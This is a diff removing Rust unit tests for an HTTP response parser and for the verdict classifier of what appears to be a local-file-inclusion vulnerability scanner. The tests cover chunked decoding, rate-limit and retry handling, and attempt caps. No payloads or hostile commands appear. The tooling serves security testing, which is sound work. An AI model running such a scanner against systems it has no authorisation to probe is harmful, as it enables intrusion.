-        assert_eq!(parse_status_from_head(&buf[..first]), Some(100));
-        let search_from = first + 4;
-        let second_rel = find_subslice(&buf[search_from..], b"\r\n\r\n").unwrap();
-        let second_abs = search_from + second_rel;
-        assert_eq!(
-            parse_status_from_head(&buf[search_from..second_abs]),
-            Some(200)
-        );
-    }
-
-    // --- Regression: interim headers must not contaminate the final block ---
-
-    #[test]
-    fn interim_headers_do_not_contaminate_final() {
-        let buf = b"HTTP/1.1 100 Continue\r\nTransfer-Encoding: chunked\r\n\r\n\
-                    HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nhi";
-        let mut search_from = 0;
-        let (mut header_end, mut content_length, mut has_te) = (None, None, false);
-        while let Some(rel) = find_subslice(&buf[search_from..], b"\r\n\r\n") {
-            let abs = search_from + rel;
-            if parse_status_from_head(&buf[search_from..abs])
-                .map(|s| (100..200).contains(&s))
-                .unwrap_or(false)
-            {
-                search_from = abs + 4;
-                continue;
-            }
-            header_end = Some(abs);
-            let head_lower = String::from_utf8_lossy(&buf[search_from..abs]).to_lowercase();
-            content_length = parse_content_length(&head_lower);
-            has_te = head_lower.lines().any(|l| {
-                l.strip_prefix("transfer-encoding:")
-                    .map(|v| v.trim().contains("chunked"))
-                    .unwrap_or(false)
-            });
-            break;
-        }
-        assert_eq!(content_length, Some(2));
-        assert!(!has_te);
-        assert_eq!(
-            parse_status_from_head(&buf[search_from..header_end.unwrap()]),
-            Some(200)
-        );
-    }
-
-    // --- Chunked framing ---
-
-    #[test]
-    fn chunked_complete() {
-        assert!(matches!(
-            try_decode_chunked(b"5\r\nhello\r\n0\r\n\r\n"),
-            ChunkedState::Complete(v) if v == b"hello"
-        ));
-    }
-
-    #[test]
-    fn chunked_extensions_and_trailers() {
-        assert!(matches!(
-            try_decode_chunked(b"5;x=y\r\nhello\r\n0\r\nX-A: 1\r\n\r\n"),
-            ChunkedState::Complete(v) if v == b"hello"
-        ));
-    }
-
-    #[test]
-    fn chunked_truncated() {
-        assert!(matches!(
-            try_decode_chunked(b"5\r\nhel"),
-            ChunkedState::Incomplete
-        ));
-    }
-
-    #[test]
-    fn chunked_missing_crlf() {
-        assert!(matches!(
-            try_decode_chunked(b"5\r\nhelloXX0\r\n\r\n"),
-            ChunkedState::Malformed(_)
-        ));
-    }
-
-    #[test]
-    fn chunked_bad_size() {
-        assert!(matches!(
-            try_decode_chunked(b"ZZ\r\nhello\r\n0\r\n\r\n"),
-            ChunkedState::Malformed(_)
-        ));
-    }
-
-    #[test]
-    fn chunked_zero_only() {
-        assert!(matches!(
-            try_decode_chunked(b"0\r\n\r\n"),
-            ChunkedState::Complete(v) if v.is_empty()
-        ));
-    }
-
-    // --- Regression: oversize claim must be Malformed, not Incomplete ---
-
-    #[test]
-    fn chunked_oversize_claim_is_rejected_before_body_check() {
-        // 0xFFFFFFFFFFFFFFFF is usize::MAX on 64-bit (size limit fires) and
-        // unparseable on 32-bit. Both paths yield Malformed; Incomplete must
-        // not be reachable for this input.
-        assert!(matches!(
-            try_decode_chunked(b"FFFFFFFFFFFFFFFF\r\nx"),
-            ChunkedState::Malformed(_)
-        ));
-    }
-
-    #[test]
-    fn chunked_rejects_many_trailers() {
-        let mut buf = b"0\r\n".to_vec();
-        for _ in 0..100 {
-            buf.extend_from_slice(b"X-A: 1\r\n");
-        }
-        buf.extend_from_slice(b"\r\n");
-        assert!(matches!(
-            try_decode_chunked(&buf),
-            ChunkedState::Malformed(_)
-        ));
-    }
-
-    // --- Atomic attempt reservation ---
-
-    #[test]
-    fn cap_is_atomic() {
-        let counter = Arc::new(AtomicUsize::new(0));
-        let mut handles = Vec::new();
-        for _ in 0..16 {
-            let c = counter.clone();
-            handles.push(thread::spawn(move || {
-                let mut granted = 0usize;
-                while try_reserve(&c, 100) {
-                    granted += 1;
-                }
-                granted
-            }));
-        }
-        let total: usize = handles.into_iter().map(|h| h.join().unwrap()).sum();
-        assert_eq!(total, 100);
-    }
-
-    // --- Verdict classification table ---
-
-    #[test]
-    fn classify_table() {
-        let cfg = test_config();
-        let none: Vec<LfiHit> = vec![];
-        let hit = || {
-            vec![LfiHit {
-                output: "x".into(),
-                disabled: false,
-            }]
-        };
-        let hit_empty = || {
-            vec![LfiHit {
-                output: "[executed — empty output]".into(),
-                disabled: false,
-            }]
-        };
-
-        let err = RawResponse {
-            transport_error: Some("x".into()),
-            ..Default::default()
-        };
-        assert_eq!(classify(&cfg, &err, &none, 0).0, Verdict::Unknown);
-
-        let to = RawResponse {
-            timed_out: true,
-            ..Default::default()
-        };
-        assert_eq!(classify(&cfg, &to, &none, 0).0, Verdict::Unknown);
-
-        assert_eq!(
-            classify(&cfg, &rr_status(429), &none, 0).0,
-            Verdict::RateLimited
-        );
-        assert_eq!(
-            classify(&cfg, &rr_status(401), &none, 0).0,
-            Verdict::AuthRequired
-        );
-        assert_eq!(
-            classify(&cfg, &rr_status(500), &none, 0).0,
-            Verdict::HttpError
-        );
-        assert_eq!(
-            classify(&cfg, &rr_status(200), &hit(), 1).0,
-            Verdict::Unconfirmed
-        );
-        assert_eq!(
-            classify(&cfg, &rr_status(200), &hit_empty(), 1).0,
-            Verdict::Unconfirmed
-        );
-        assert_eq!(classify(&cfg, &rr_status(200), &none, 5).0, Verdict::NoLfi);
-        assert_eq!(
-            classify(&cfg, &rr_status(200), &none, 0).0,
-            Verdict::Unconfirmed
-        );
-    }
-
-    #[test]
-    fn rate_limit_via_header() {
-        let cfg = test_config();
-        let mut rr = rr_status(200);
-        rr.rate_limit_signal = Some("X-RateLimit-Remaining: 0".into());
-        assert_eq!(classify(&cfg, &rr, &[], 0).0, Verdict::RateLimited);
-    }
-
-    // --- Regression: Retry-After is a signal, not a verdict ---
-
-    #[test]
-    fn retry_after_on_503_stays_http_error() {
-        let cfg = test_config();
-        let mut rr = rr_status(503);
-        rr.retry_after = Some("5".into());
-        assert_eq!(classify(&cfg, &rr, &[], 0).0, Verdict::HttpError);
-    }
-
-    #[test]
-    fn retry_after_on_429_is_rate_limited() {
-        // 429 alone decides; Retry-After is supplementary.
-        let cfg = test_config();
-        let mut rr = rr_status(429);
-        rr.retry_after = Some("5".into());
-        assert_eq!(classify(&cfg, &rr, &[], 0).0, Verdict::RateLimited);
-    }
-
-    #[test]
-    fn retry_after_on_200_is_not_a_verdict_change() {
-        let cfg = test_config();
-        let mut rr = rr_status(200);
-        rr.retry_after = Some("5".into());
-        assert_eq!(classify(&cfg, &rr, &[], 0).0, Verdict::Unconfirmed);
-        assert_eq!(classify(&cfg, &rr, &[], 5).0, Verdict::NoLfi);
-    }
 }
